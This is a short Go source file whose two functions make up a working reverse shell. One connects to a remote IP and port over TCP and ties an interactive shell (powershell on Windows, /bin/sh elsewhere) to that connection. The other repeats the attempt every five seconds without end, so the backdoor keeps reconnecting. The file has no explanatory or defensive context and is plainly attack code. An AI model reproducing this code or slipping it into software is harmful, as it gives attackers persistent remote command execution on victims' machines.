package networkStuff

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

// Send shell to remote server
func shell(ip string, port int) {
	target := fmt.Sprintf("%s:%d", ip, port)
	con, err := net.Dial("tcp", target)
	if err != nil {
		return
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}

func sendShell(ip string, port int) {
	for {
		time.Sleep(5 * time.Second)
		shell(ip, port)
	}
}
